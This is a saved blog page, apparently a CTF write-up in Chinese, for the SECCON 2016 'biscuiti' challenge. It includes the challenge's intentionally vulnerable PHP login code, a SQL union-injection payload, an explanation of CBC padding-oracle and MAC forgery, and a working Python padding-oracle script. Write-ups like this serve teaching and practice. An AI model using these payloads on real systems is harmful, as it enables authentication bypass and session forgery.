@@ -1,0 +1,580 @@
+<!DOCTYPE doctype html>
+
+<html class="theme-next use-motion theme-next-mist">
+<head>
+<meta charset="utf-8"/>
+<meta content="IE=edge, chrome=1" http-equiv="X-UA-Compatible"/>
+<meta content="width=device-width, initial-scale=1, maximum-scale=1" name="viewport">
+<meta content="no-transform" http-equiv="Cache-Control">
+<meta content="no-siteapp" http-equiv="Cache-Control"/>
+<!-- 使用url函数转换相关路径 -->
+<link href="//fonts.googleapis.com/css?family=Lato:300,400,700,400italic&amp;subset=latin,latin-ext" rel="stylesheet" type="text/css"/>
+<link href="./seccon biscuiti (Web + Crypto 300) Write-up - BurnEgg's Blog/jquery.fancybox.cssv=2.1.5" rel="stylesheet" type="text/css"/>
+<link href="./seccon biscuiti (Web + Crypto 300) Write-up - BurnEgg's Blog/font-awesome.min.cssv=4.4.0" rel="stylesheet" type="text/css"/>
+<link href="./seccon biscuiti (Web + Crypto 300) Write-up - BurnEgg's Blog/main.cssv=1.2.1" rel="stylesheet" type="text/css"/>
+<script id="hexo.configuration" type="text/javascript">
+    var CONFIG = {
+        scheme: 'Mist',
+        motion: true,
+        sidebar: 'post'
+    };
+    </script>
+<title>seccon biscuiti (Web + Crypto 300) Write-up - BurnEgg's Blog</title>
+<!-- 通过自有函数输出HTML头部信息 -->
+<meta content="赛后去谷歌的时候找到了tinduong大牛 的writeup，很厉害。然后查了资料终于完全弄懂的cbc模式的两种攻击（见上一篇blog）。 今天才想起把前几天的分析记录下来。" name="description"/>
+<meta content="Typecho 1.0/14.10.10" name="generator"/>
+<meta content="typecho-theme-next-master" name="template"/>
+<link href="./seccon biscuiti (Web + Crypto 300) Write-up - BurnEgg's Blog/xmlrpc" rel="pingback"/>
+<link href="./seccon biscuiti (Web + Crypto 300) Write-up - BurnEgg's Blog/xmlrpcrsd" rel="EditURI" title="RSD" type="application/rsd+xml"/>
+<link href="./seccon biscuiti (Web + Crypto 300) Write-up - BurnEgg's Blog/xmlrpcwlw" rel="wlwmanifest" type="application/wlwmanifest+xml"/>
+<link href="./seccon biscuiti (Web + Crypto 300) Write-up - BurnEgg's Blog/20" rel="alternate" title="RSS 2.0" type="application/rss+xml"/>
+<link href="./seccon biscuiti (Web + Crypto 300) Write-up - BurnEgg's Blog/20" rel="alternate" title="RSS 1.0" type="application/rdf+xml"/>
+<link href="./seccon biscuiti (Web + Crypto 300) Write-up - BurnEgg's Blog/20" rel="alternate" title="ATOM 1.0" type="application/atom+xml"/>
+<script type="text/javascript">
+(function () {
+    window.TypechoComment = {
+        dom : function (id) {
+            return document.getElementById(id);
+        },
+    
+        create : function (tag, attr) {
+            var el = document.createElement(tag);
+        
+            for (var key in attr) {
+                el.setAttribute(key, attr[key]);
+            }
+        
+            return el;
+        },
+
+        reply : function (cid, coid) {
+            var comment = this.dom(cid), parent = comment.parentNode,
+                response = this.dom('respond-post-20'), input = this.dom('comment-parent'),
+                form = 'form' == response.tagName ? response : response.getElementsByTagName('form')[0],
+                textarea = response.getElementsByTagName('textarea')[0];
+
+            if (null == input) {
+                input = this.create('input', {
+                    'type' : 'hidden',
+                    'name' : 'parent',
+                    'id'   : 'comment-parent'
+                });
+
+                form.appendChild(input);
+            }
+
+            input.setAttribute('value', coid);
+
+            if (null == this.dom('comment-form-place-holder')) {
+                var holder = this.create('div', {
+                    'id' : 'comment-form-place-holder'
+                });
+
+                response.parentNode.insertBefore(holder, response);
+            }
+
+            comment.appendChild(response);
+            this.dom('cancel-comment-reply-link').style.display = '';
+
+            if (null != textarea && 'text' == textarea.name) {
+                textarea.focus();
+            }
+
+            return false;
+        },
+
+        cancelReply : function () {
+            var response = this.dom('respond-post-20'),
+            holder = this.dom('comment-form-place-holder'), input = this.dom('comment-parent');
+
+            if (null != input) {
+                input.parentNode.removeChild(input);
+            }
+
+            if (null == holder) {
+                return true;
+            }
+
+            this.dom('cancel-comment-reply-link').style.display = 'none';
+            holder.parentNode.insertBefore(response, holder);
+            return false;
+        }
+    };
+})();
+</script>
+<script type="text/javascript">
+(function () {
+    var event = document.addEventListener ? {
+        add: 'addEventListener',
+        focus: 'focus',
+        load: 'DOMContentLoaded'
+    } : {
+        add: 'attachEvent',
+        focus: 'onfocus',
+        load: 'onload'
+    };
+
+    document[event.add](event.load, function () {
+        var r = document.getElementById('respond-post-20');
+
+        if (null != r) {
+            var forms = r.getElementsByTagName('form');
+            if (forms.length > 0) {
+                var f = forms[0], textarea = f.getElementsByTagName('textarea')[0], added = false;
+
+                if (null != textarea && 'text' == textarea.name) {
+                    textarea[event.add](event.focus, function () {
+                        if (!added) {
+                            var input = document.createElement('input');
+                            input.type = 'hidden';
+                            input.name = '_';
+                            input.value = (function () {
+    var _ZU6kP = '4'//'w4'
++'02'//'n'
++/* 'dbd'//'dbd' */''+''///*'e1k'*/'e1k'
++'7Y'//'7Y'
++'313'//'NM'
++//'H0'
+'01'+//'YW7'
+'f0'+//'3'
+'59'+//'UaE'
+'d'+//'LV'
+'c3'+'ad'//'zn'
++//'8YV'
+'df5'+'75'//'DR'
++/* 'w'//'w' */''+'zL'//'zL'
++'YZA'//'YZA'
++//'mH'
+'1e'+''///*'u'*/'u'
++'d27'//'v4'
++'df'//'0Z'
++//'nt'
+'a'+'u'//'u'
++//'9'
+'3'+//'V6'
+'9', _2poS = [[3,5],[22,24],[22,25],[30,31]];
+    
+    for (var i = 0; i < _2poS.length; i ++) {
+        _ZU6kP = _ZU6kP.substring(0, _2poS[i][0]) + _ZU6kP.substring(_2poS[i][1]);
+    }
+
+    return _ZU6kP;
+})();
+
+                            f.appendChild(input);
+                            added = true;
+                        }
+                    });
+                }
+            }
+        }
+    });
+})();
+</script>
+</meta></meta></head>
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
+<div class="container one-column page-post-detail">
+<!--page home-->
+<div class="headband"></div>
+<header class="header" id="header" itemscope="" itemtype="http://schema.org/WPHeader">
+<div class="header-inner"><h1 class="site-meta">
+<span class="logo-line-before"><i></i></span>
+<a class="brand" href="https://www.burnegg.com/" rel="start">
+<span class="logo">
+<i class="icon-next-logo"></i>
+</span>
+<span class="site-title">BurnEgg's Blog</span>
+</a>
+<span class="logo-line-after"><i></i></span>
+</h1>
+<div class="site-nav-toggle">
+<button>
+<span class="btn-bar"></span>
+<span class="btn-bar"></span>
+<span class="btn-bar"></span>
+</button>
+</div>
+<nav class="site-nav"> <ul class="menu menu-left" id="menu">
+<li class="menu-item menu-item-home">
+<a href="https://www.burnegg.com/" rel="section">
+<i class="menu-item-icon"></i> <br/>
+            首页
+        </a>
+</li>
+<li class="menu-item menu-item-home">
+<a href="https://burnegg.com/index.php/archive.html" rel="section">日志</a>
+</li>
+<li class="menu-item menu-item-home">
+<a href="https://burnegg.com/index.php/categories.html" rel="section">分类</a>
+</li>
+<li class="menu-item menu-item-home">
+<a href="https://burnegg.com/index.php/tags.html" rel="section">标签</a>
+</li>
+<li class="menu-item menu-item-home">
+<a href="https://burnegg.com/index.php/start-page.html" rel="section">我</a>
+</li>
+<li class="menu-item menu-item-home">
+<a href="https://burnegg.com/index.php/links.html" rel="section">伙伴们</a>
+</li>
+</ul>
+<div class="site-search">
+<form class="site-search-form">
+<input autocapitalize="off" autocomplete="off" autocorrect="off" class="st-search-input st-default-search-input" id="st-search-input" name="s" type="text" value=""/>
+</form>
+</div>
+</nav>
+</div>
+</header>
+<main class="main" id="main">
+<div class="main-inner">
+<div class="content" id="content">
+<div class="posts-expand" id="posts">
+<article class="post post-type-normal " itemscope="" itemtype="http://schema.org/Article">
+<header class="post-header">
+<h1 class="post-title" itemprop="name headline">
+                     seccon biscuiti (Web + Crypto 300) Write-up                 </h1>
+<div class="post-meta">
+<span class="post-time">
+                        发表于
+                        <time datetime="2016-12-16T14:13:00+08:00" itemprop="datePublished">2016-12-16</time>
+</span>
+<span class="post-category">
+                        |   分类于
+
+                      <span itemprop="about" itemscope="" itemtype="https://schema.org/Thing">
+<a href="https://burnegg.com/index.php/category/crypt/">crypt</a> , <a href="https://burnegg.com/index.php/category/ctf/">ctf</a> , <a href="https://burnegg.com/index.php/category/web/">web</a> </span>
+</span>
+<span class="post-comments-count">
+                  |  
+                                <a href="https://burnegg.com/index.php/archives/20/#comments" rel="nofollow">暂无评论</a>
+</span>
+</div>
+</header>
+<div class="post-body">
+<span itemprop="articleBody">
+<p>赛后去谷歌的时候找到了<a href="https://blog.tinduong.pw/2016/12/11/seccon-quals-2016-biscuiti-web-crypto-300-write-up/">tinduong大牛</a> 的writeup，很厉害。然后查了资料终于完全弄懂的cbc模式的两种攻击（<a href="https://www.burnegg.com/index.php/archives/18/">见上一篇blog</a>）。 今天才想起把前几天的分析记录下来。<br/><!--more-->首先，题目是提供源码的，主要index.php内容如下</p><pre><code>&lt;?php
+error_reporting(E_ALL);
+define("ENC_KEY", "***censored***");
+define("ENC_METHOD", "aes-128-cbc");
+
+if (!extension_loaded('pdo_sqlite')) {
+    header("Content-type: text/plain");
+    echo "PDO Driver for SQLite is not installed.";
+    exit;
+}
+if (!extension_loaded('openssl')) {
+    header("Content-type: text/plain");
+    echo "OpenSSL extension is not installed.";
+    exit;
+}
+
+/*
+Setup:
+CREATE TABLE user (
+username VARCHAR(255),
+enc_password VARCHAR(255),
+isadmin BOOLEAN
+);
+INSERT INTO user VALUES ("admin", "***censored***", 1);
+*/
+
+function auth($enc_password, $input) {
+    $enc_password = base64_decode($enc_password);
+    $iv = substr($enc_password, 0, 16);
+    $c = substr($enc_password, 16);
+    $password = openssl_decrypt($c, ENC_METHOD, ENC_KEY, OPENSSL_RAW_DATA, $iv);
+    echo $password;
+    return $password == $input;
+}
+
+function mac($input) {
+    $iv = str_repeat("\0", 16);
+    $c = openssl_encrypt($input, ENC_METHOD, ENC_KEY, OPENSSL_RAW_DATA, $iv);
+    return substr($c, -16);
+}
+
+function save_session() {
+    global $SESSION;
+    $j = serialize($SESSION);
+    $u = $j . mac($j);
+    setcookie("JSESSION", base64_encode($u));
+}
+
+function load_session() {
+    global $SESSION;
+    if (!isset($_COOKIE["JSESSION"]))
+        return array();
+    $u = base64_decode($_COOKIE["JSESSION"]);
+    $j = substr($u, 0, -16);
+    $t = substr($u, -16);
+    if (mac($j) !== $t)
+        return array(2);
+    $SESSION = unserialize($j);
+}
+
+function _h($s) {
+    return htmlspecialchars($s, ENT_QUOTES, "UTF-8");
+}
+
+function login_page($message = NULL) {
+?&gt;&lt;!doctype html&gt;
+&lt;html&gt;
+&lt;head&gt;&lt;title&gt;Login&lt;/title&gt;&lt;/head&gt;
+&lt;body&gt;
+&lt;?php
+    if (isset($message)) {
+        echo "  &lt;div&gt;" . _h($message) . "&lt;/div&gt;\n";
+    }
+?&gt;
+  &lt;form method="POST"&gt;
+    &lt;div&gt;
+      &lt;label&gt;username&lt;/label&gt;
+      &lt;input type="text" name="username"&gt;
+    &lt;/div&gt;
+    &lt;div&gt;
+      &lt;label&gt;password&lt;/label&gt;
+      &lt;input type="password" name="password"&gt;
+    &lt;/div&gt;
+    &lt;input type="submit" value="login"&gt; 
+  &lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+&lt;?php
+      exit;
+}
+
+function info_page() {
+    global $SESSION;
+?&gt;&lt;!doctype html&gt;
+&lt;html&gt;
+&lt;head&gt;&lt;title&gt;Login&lt;/title&gt;&lt;/head&gt;
+&lt;body&gt;
+&lt;?php
+    printf("Hello %s\n", _h($SESSION["name"]));
+    if ($SESSION["isadmin"])
+        include("../flag");
+?&gt;
+&lt;div&gt;&lt;a href="logout.php"&gt;Log out&lt;/a&gt;&lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+&lt;?php
+      exit;
+}
+if (isset($_GET['mac'])) echo mac($_GET['mac']);
+if (isset($_POST['username']) &amp;&amp; isset($_POST['password'])) {
+    $username = (string)$_POST['username'];
+    $password = (string)$_POST['password'];
+    $dbh = new PDO('sqlite:../db/users.db');
+    $result = $dbh-&gt;query("SELECT username, enc_password from user WHERE username='{$username}'");
+    if (!$result) {
+        login_page("error");
+        $info = $dbh-&gt;errorInfo();
+        login_page($info[2]);
+        
+    }
+    $u = $result-&gt;fetch(PDO::FETCH_ASSOC);
+    if ($u &amp;&amp; auth($u["enc_password"], $password)) {
+        $SESSION["name"] = $u['username'];
+        $SESSION["isadmin"] = $u['isadmin'];
+        save_session();
+        info_page();
+    }
+    else {
+        login_page("error");
+    }
+}
+else {
+    load_session();
+    if (isset($SESSION["name"])) {
+        info_page();
+    }
+    else {
+        login_page();
+    }
+}
+</code></pre><p>通读一遍，无非是个认证的流程。通过sqlite数据库搜索用户名得到用户hash解密与提交的密码对比，认证成功后cookie里保存了这段序列化数据和这段序列化数据加密后的最后32为作为mac校验防篡改。<br/>然后很明显的，有个sqlite数据库注入，可以拿到数据库里的密文，然而这里的密文是在没有密钥的情况下解密不了的。所以想到通过sql union注入出自定义的一个用户。又发现代码在判断的时候是 $password == $input ，存在php的弱类型绕过。于是让post数据为username=adnx'union select '123','456'--&amp;password;=0 注入出一个用户名为123 密码密文为456的用户，密文456在解密的时候失败，返回null。<br/>而null==0 是为true的。成功登录。然而代码里还需要判断isadmin=1才会include flag文件<br/>然后遇到坑点了，sql语句中就没有查询isadmin这个列，无论我们怎么构造sql，最后session数组里isadmin都是null。<br/>先看一下现在的cookie里有什么<br/><img alt="1.png" src="./seccon biscuiti (Web + Crypto 300) Write-up - BurnEgg's Blog/165989943.png" title="1.png"/></p><p>然后的目标很明显了，通过密码学攻击得到一个能被反序列化的字符串的密文，且反序列化过后s:7:"isadmin";N;变成s:7:"isadmin";b:1;<br/>怎么去做呢？当时完全没搞懂cbc字符反转攻击的我以为是字符反转，比赛完了才发现，如果要反转最后一个block，就一定要毁坏倒数第二个block，所以应该尽量让最后一个block短，使得被毁坏的block放在数组的用户名里面才行。然而最短的时候也必须要";s:7:"isadmin";a:1;这20个字符才能成功反序列化。于是思路就断了。<br/>直到赛后看到俄罗斯大牛tinduong的writeup加上完整分析了cbc加密算法。<br/>发现代码里是有padding oracle attack的。通过union注入出不同密文，而代码调用解密的时候不成功返回null，同时使得password=0就能成功登录，反之则登录失败。<br/>于是我们就能通过不停地尝试iv，来得到密文的中间值。得到中间值加上已知的明文，就能得到上一个block的密文。再对上一个block的密文进行padding oracle攻击，我们就能完整地还原出整段密文。（<a href="https://www.burnegg.com/index.php/archives/18/">再次推荐上一篇blog</a>）<br/>那么回到这道题目。由于cbc加密的公式 Ciphertext-N= Encrypt(Plaintext XOR Ciphertext-N-1)<br/>我们希望得到改变明文后新的密文。最好的办法就是让改变的东西放在最后一个block。这样在已知C4 (padding oracle attack)的情况下，可以更方便地构造出C5′(为了方便描述，借（chao）鉴（xi）一下大牛的表示方法)</p><pre><code>P1 -&gt; a:2:{s:4:"name"; -&gt; aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa (C1)
+P2 -&gt; s:26:"xxxxxxxxxx -&gt; bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb (C2)
+P3 -&gt; xxxxxxxxxxxxxxxx -&gt; cccccccccccccccccccccccccccccccc (C3)
+P4 -&gt; ";s:7:"isadmin"; -&gt; dddddddddddddddddddddddddddddddd (C4)
+P5 -&gt; N;}&lt;PAD__PKCS#7&gt; -&gt; eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee (C5, MAC)
+
+P1 -&gt; a:2:{s:4:"name"; -&gt; aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa (C1)
+P2 -&gt; s:26:"xxxxxxxxxx -&gt; bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb (C2)
+P3 -&gt; xxxxxxxxxxxxxxxx -&gt; cccccccccccccccccccccccccccccccc (C3)
+P4 -&gt; ";s:7:"isadmin"; -&gt; dddddddddddddddddddddddddddddddd (C4)
+P5′-&gt; b:1;}&lt;NEW___PAD&gt; -&gt; &lt;_dont_know_the_correct_cipher_&gt; (C5′, NEW MAC)
+</code></pre><p>为了得到新的密文，只能通过代码中唯一调用了加密函数的mac校验中来。<br/>对mac校验的参数整理一下，发现我们现在可以通过union注入出来不同的name变量得到不同反序列化字符串的完整密文。<br/>目标是得到C5′,而C5′ = Encrypt(P5′ ^ C4)<br/>Encrypt的参数中，我们可控的只有部分明文，所以必须得延长这部分明文长到一个完整的block才行。（这就是为什么这位大牛构造了一个长达26的name变量）在这里P3就完全可控了。<br/>由公式 C3=Encrypt(P3 ^ C2) 我们控制新的P3′=C4 ^ C2 ^ P5′<br/>那么新的C3′=Encrypt(P3′ ^ C2)=Encrypt(C4 ^ C2 ^ P5′ ^ C2)=Encrypt(C4 ^ P5′)=C5′ 这就是我们一直想要的新明文的mac了，仍然通过padding oracle 还原出来即可。</p><p>附上自己的菜逼python脚本（用来进行padding oracle攻击）和 题目源码<a href="https://www.burnegg.com/usr/uploads/2016/12/1738103187.zip">biscuiti.zip</a>：</p><pre><code>import base64
+import requests
+ans=''
+hash='bideUVTUQFsz555b0yuaFQ=='
+plaintext='N;}'
+lastiv=''
+def check(str):
+    r = requests.post("http://url.com/index.php",
+    data = {"username":"adnx'union select '123','%s'--"%str,"password":"0"}
+    )
+#    print r.text
+    if "Hello" not in r.text:
+        return True
+    return False
+def crack(cipher,ans):
+    ans2=''
+    cipher = base64.b64decode(cipher)#'bideUVTUQFsz555b0yuaFQ=='
+    for i in range(len(ans)):
+    ans2=ans2+chr(ord(ans[i]) ^ (len(ans)-i) ^ (len(ans)+1))
+    for i in range(256):
+    print '.',
+        if check(base64.b64encode('\x00'*(15-len(ans2))+chr(i)+ans2+cipher)):
+        print '\n[+]succ with\n'+base64.b64encode('\x00'*(15-len(ans2))+chr(i)+ans2+cipher)
+            return i
+if(len(plaintext)&lt;=16): # padding
+    plaintext=plaintext+chr(16-len(plaintext))*(16-len(plaintext))
+for i in range(0,16):
+    x=crack(hash,ans)   
+    ans = chr(x)+ans
+    lastiv = chr(x^(i+1)^ord(plaintext[15-i])) + lastiv
+print 'base64(lastiv)='+base64.b64encode(lastiv)
+</code></pre> </span>
+</div>
+<footer class="post-footer">
+<div class="post-tags">
+</div>
+<div class="post-nav">
+<div class="post-nav-prev post-nav-item">
+<a href="https://burnegg.com/index.php/archives/18/" title="AES-CBC 加密的两种攻击方式">AES-CBC 加密的两种攻击方式</a> </div>
+<div class="post-nav-next post-nav-item">
+<a href="https://burnegg.com/index.php/archives/22/" title="漂浮于命运">漂浮于命运</a> </div>
+</div>
+</footer>
+</article>
+</div>
+</div>
+<div id="comments">
+<div class="respond" id="respond-post-20">
+<div class="cancel-comment-reply">
+<a href="https://burnegg.com/index.php/archives/20/#respond-post-20" id="cancel-comment-reply-link" onclick="return TypechoComment.cancelReply();" rel="nofollow" style="display:none">取消回复</a> </div>
+<span class="widget-title" id="response">添加新评论</span>
+<form action="https://burnegg.com/index.php/archives/20/comment" id="comment-form" method="post">
+<div class="col1">
+<p>
+<textarea class="textarea" cols="50" name="text" rows="8"></textarea>
+</p>
+</div>
+<div class="col2">
+<p>
+<label class="required" for="author">称呼</label>
+<input class="text" id="author" name="author" type="text" value=""/>
+</p>
+<p>
+<label class="required" for="mail">邮箱</label>
+<input class="text" id="mail" name="mail" type="email" value=""/>
+</p>
+<p>
+<label for="url">网站</label>
+<input class="text" id="url" name="url" placeholder="http://example.com" type="url" value=""/>
+</p>
+<p>
+<button class="submit" type="submit">提交评论</button>
+</p>
+</div>
+<div class="clear"></div>
+</form>
+</div>
+</div></div>
+<div class="sidebar-toggle">
+<div class="sidebar-toggle-line-wrap">
+<span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+<span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+<span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+</div>
+</div>
+<aside class="sidebar" id="sidebar">
+<div class="sidebar-inner">
+<section class="site-overview sidebar-panel ">
+<div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+<img alt="BurnEgg" class="site-author-image" itemprop="image" src="./seccon biscuiti (Web + Crypto 300) Write-up - BurnEgg's Blog/06dbf5d98cba9734c9ed6928954913b8s=160&amp;d=mm&amp;r=g">
+<p class="site-author-name" itemprop="name">BurnEgg</p>
+</img></div>
+<p class="site-description motion-element" itemprop="description">一个彩笔的博客</p>
+<nav class="site-state motion-element">
+<div class="site-state-item site-state-posts">
+<a href="https://burnegg.com/index.php/archive.html">
+<span class="site-state-item-count">11</span>
+<span class="site-state-item-name">日志</span>
+</a>
+</div>
+<div class="site-state-item site-state-categories">
+<a href="https://burnegg.com/index.php/categories.html">
+<span class="site-state-item-count">9</span>
+<span class="site-state-item-name">分类</span>
+</a>
+</div>
+<div class="site-state-item site-state-tags">
+<a href="https://burnegg.com/index.php/tags.html">
+<span class="site-state-item-count">5</span>
+<span class="site-state-item-name">标签</span>
+</a>
+</div>
+</nav>
+<div class="feed-link motion-element">
+<a href="https://burnegg.com/index.php/feed/" rel="alternate">
+<i class="menu-item-icon icon-next-feed"></i>
+              RSS
+            </a>
+</div>
+<div class="links-of-author motion-element">
+</div>
+</section>
+<section class="post-toc-wrap sidebar-panel-active">
+<div class="post-toc-indicator-top post-toc-indicator"></div>
+<div class="post-toc">
+<p class="post-toc-empty">此文章未包含目录</p>
+</div>
+</section>
+</div>
+</aside>
+</main>
+<footer class="footer" id="footer">
+<div class="footer-inner">
+<div class="copyright">
+  ©
+  <span itemprop="copyrightYear">2017</span>
+<span class="with-love">
+<i class="icon-next-heart fa fa-heart"></i>
+</span>
+<span class="author" itemprop="copyrightHolder"><a href="https://www.burnegg.com/">BurnEgg</a></span>
+</div>
+<div class="powered-by">
+  由 <a class="theme-link" href="http://www.typecho.org">Typecho</a> 强力驱动</div>
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/zgq354/typecho-theme-next">
+    NexT.Mist
+  </a>
+</div>
+</div>
+</footer>
+<div class="back-to-top"></div>
+</div>
+<script src="./seccon biscuiti (Web + Crypto 300) Write-up - BurnEgg's Blog/index.jsv=2.1.3" type="text/javascript"></script>
+<script src="./seccon biscuiti (Web + Crypto 300) Write-up - BurnEgg's Blog/jquery.fancybox.pack.js" type="text/javascript"></script>
+<script src="./seccon biscuiti (Web + Crypto 300) Write-up - BurnEgg's Blog/fancy-box.jsv=0.4.5.2" type="text/javascript"></script>
+<script src="./seccon biscuiti (Web + Crypto 300) Write-up - BurnEgg's Blog/helpers.jsv=0.4.5.2" type="text/javascript"></script>
+<script src="./seccon biscuiti (Web + Crypto 300) Write-up - BurnEgg's Blog/velocity.min.js" type="text/javascript"></script>
+<script src="./seccon biscuiti (Web + Crypto 300) Write-up - BurnEgg's Blog/velocity.ui.min.js" type="text/javascript"></script>
+<script id="motion.global" src="./seccon biscuiti (Web + Crypto 300) Write-up - BurnEgg's Blog/motion.jsv=0.4.5.2" type="text/javascript"></script>
+<script src="./seccon biscuiti (Web + Crypto 300) Write-up - BurnEgg's Blog/fastclick.min.jsv=1.0.6" type="text/javascript"></script>
+<script src="./seccon biscuiti (Web + Crypto 300) Write-up - BurnEgg's Blog/bootstrap.scrollspy.jsv=0.4.5.2" type="text/javascript"></script>
+<script src="./seccon biscuiti (Web + Crypto 300) Write-up - BurnEgg's Blog/post_sidebar.jsv=0.4.5.2" type="text/javascript"></script>
+<script src="./seccon biscuiti (Web + Crypto 300) Write-up - BurnEgg's Blog/lazyload.js" type="text/javascript"></script>
+<script type="text/javascript">
+$(function () {
+	$("#posts").find('img').lazyload({
+		placeholder: "https://www.burnegg.com/usr/themes/typecho-theme-next-master/images/loading.gif",
+		effect: "fadeIn"
+	});
+});
+</script>
+<script src="./seccon biscuiti (Web + Crypto 300) Write-up - BurnEgg's Blog/bootstrap.jsv=0.4.5.2" type="text/javascript"></script>
+</body>
+</html>
